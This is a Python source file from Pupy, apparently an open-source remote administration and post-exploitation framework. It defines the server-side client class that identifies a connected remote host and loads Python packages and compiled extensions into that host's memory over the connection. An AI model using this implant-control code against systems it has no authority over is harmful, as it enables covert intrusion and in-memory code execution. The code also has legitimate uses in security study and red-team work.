# -*- coding: UTF8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

import os.path
import os
import textwrap
import logging
import cPickle
from .PupyErrors import PupyModuleError
import traceback
import textwrap

class PupyClient(object):
	def __init__(self, desc, pupsrv):
		self.desc=desc
		#alias
		self.conn=self.desc["conn"]
		self.pupsrv=pupsrv
		self.load_pupyimporter()

	def __str__(self):
		return "PupyClient(id=%s, user=%s, hostname=%s, platform=%s)"%(self.desc["id"], self.desc["user"], self.desc["hostname"], self.desc["platform"])

	def __del__(self):
		del self.desc

	def short_name(self):
		try:
			return self.desc["platform"][0:3].lower()+"_"+self.desc["hostname"]+"_"+self.desc["macaddr"].replace(':','')
		except Exception:
			return "unknown"

	def is_unix(self):
		return not self.is_windows()

	def is_windows(self):
		if "windows" in self.desc["platform"].lower():
			return True
		return False

	def is_proc_arch_64_bits(self):
		if "64" in self.desc["proc_arch"]:
			return True
		return False

	def get_packages_path(self):
		""" return the list of path to search packages for depending on client OS and architecture """
		path=[]
		if self.is_windows():
			if self.is_proc_arch_64_bits():
				path.append(os.path.join("packages","windows","amd64"))
			else:
				path.append(os.path.join("packages","windows","x86"))
			path.append(os.path.join("packages","windows","all"))
		elif self.is_unix():
			if self.is_proc_arch_64_bits():
				path.append(os.path.join("packages","linux","amd64"))
			else:
				path.append(os.path.join("packages","linux","x86"))
			path.append(os.path.join("packages","linux","all"))
		path.append(os.path.join("packages","all"))
		return path

	def load_pupyimporter(self):
		""" load pupyimporter in case it is not """
		if "pupyimporter" not in self.conn.modules.sys.modules:
			pupyimporter_code=""
			with open(os.path.join("packages","all","pupyimporter.py"),'rb') as f:
				pupyimporter_code=f.read()
			self.conn.execute(textwrap.dedent(
			"""
			import imp
			import sys
			def pupyimporter_preimporter(code):
				mod = imp.new_module("pupyimporter")
				mod.__name__="pupyimporter"
				mod.__file__="<memimport>\\\\pupyimporter"
				mod.__package__="pupyimporter"
				sys.modules["pupyimporter"]=mod
				exec code+"\\n" in mod.__dict__
				mod.install()
				"""))
			self.conn.namespace["pupyimporter_preimporter"](pupyimporter_code)

	def load_package(self, module_name, force=False):
		""" 
			load a python module into memory depending on what OS the client is.
			This function can load all types of modules in memory for windows both x86 and amd64 including .pyd C extensions
			For other platforms : loading .so in memory is not supported yet.
		"""
		modules_dic={}
		# start path should only use "/" as separator
		start_path=module_name.replace(".", "/")
		package_found=False
		package_path=None
		for search_path in self.get_packages_path():
			try:
				if os.path.isdir(os.path.join(search_path,start_path)): # loading a real package with multiple files
					for root, dirs, files in os.walk(os.path.join(search_path,start_path)):
						for f in files:
							module_code=""
							with open(os.path.join(root,f),'rb') as fd:
								module_code=fd.read()
							modprefix = root[len(search_path.rstrip(os.sep))+1:]
							modpath = os.path.join(modprefix,f).replace("\\","/")
							modules_dic[modpath]=module_code
						package_found=True
				else: # loading a simple file
					for ext in [".py",".pyc",".pyd"]:
						filepath=os.path.join(search_path,start_path+ext)
						if os.path.isfile(filepath):
							module_code=""
							with open(filepath,'rb') as f:
								module_code=f.read()
							cur=""
							for rep in start_path.split("/")[:-1]:
								if not cur+rep+"/__init__.py" in modules_dic:
									modules_dic[rep+"/__init__.py"]=""
								cur+=rep+"/"
								
							modules_dic[start_path+ext]=module_code
							package_found=True
							break
				if package_found:
					package_path=search_path
					break
			except Exception as e:
				raise PupyModuleError("Error while loading package %s : %s"%(module_name, traceback.format_exc()))
		if "pupyimporter" not in self.conn.modules.sys.modules:
			raise PupyModuleError("pupyimporter module does not exists on the remote side !")
		#print modules_dic
		if not modules_dic:
			raise PupyModuleError("Couldn't load package %s : no such file or directory (path=%s)"%(module_name,repr(self.get_packages_path())))
		if force or ( module_name not in self.conn.modules.sys.modules ):
			self.conn.modules.pupyimporter.pupy_add_package(cPickle.dumps(modules_dic)) # we have to pickle the dic for two reasons : because the remote side is not authorized to iterate/access to the dictionary declared on this side and because it is more efficient
			logging.debug("package %s loaded on %s from path=%s"%(module_name, self.short_name(), package_path))
			return True
		return False

